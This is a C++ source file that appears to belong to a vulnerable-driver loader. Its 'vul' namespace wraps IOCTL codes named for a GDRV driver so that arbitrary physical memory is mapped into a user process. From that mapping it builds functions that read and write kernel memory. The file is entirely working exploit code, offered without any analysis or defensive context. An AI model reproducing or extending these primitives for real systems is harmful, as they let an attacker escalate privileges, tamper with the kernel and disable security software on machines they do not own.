#include "includes.h"
#include "loader.h"

#define IOCTL_GDRV_MAP_USER_PHYS   0xC3502000
#define IOCTL_GDRV_UNMAP_USER_PHYS 0xC3502004


typedef struct _GIO_MEM_COPY {
    uint64_t physAddr;
    uint32_t size;
    uint32_t unk; // usually zero
} GIO_MEM_COPY;


PVOID vul::MapPhysicalMemory( HANDLE hDevice, uint64_t physAddr, uint32_t size ) {
    GIO_MEM_COPY input = { physAddr, size, 0 };
    PVOID outBuf = nullptr;

    DWORD bytesReturned = 0;
    if ( !DeviceIoControl(
        hDevice,
        IOCTL_GDRV_MAP_USER_PHYS,
        &input, sizeof( input ),
        &outBuf, sizeof( outBuf ),
        &bytesReturned,
        nullptr
    ) ) {
        return nullptr;
    }

    return outBuf;
}

void vul::UnmapPhysicalMemory( HANDLE hDevice, PVOID mappedAddr ) {
    DWORD bytesReturned = 0;
    DeviceIoControl(
        hDevice,
        IOCTL_GDRV_UNMAP_USER_PHYS,
        &mappedAddr, sizeof( mappedAddr ),
        nullptr, 0,
        &bytesReturned,
        nullptr
    );
}

bool vul::ReadKernelMemory( HANDLE hDevice, uint64_t physAddr, void* buffer, size_t size ) {
    PVOID mapped = vul::MapPhysicalMemory( hDevice, physAddr, ( uint32_t )size );
    if ( !mapped )
        return false;

    memcpy( buffer, mapped, size );
    vul::UnmapPhysicalMemory( hDevice, mapped );
    return true;
}

bool vul::WriteKernelMemory( HANDLE hDevice, uint64_t physAddr, const void* data, size_t size ) {
    PVOID mapped = vul::MapPhysicalMemory( hDevice, physAddr, ( uint32_t )size );
    if ( !mapped )
        return false;

    memcpy( mapped, data, size );
    vul::UnmapPhysicalMemory( hDevice, mapped );
    return true;
}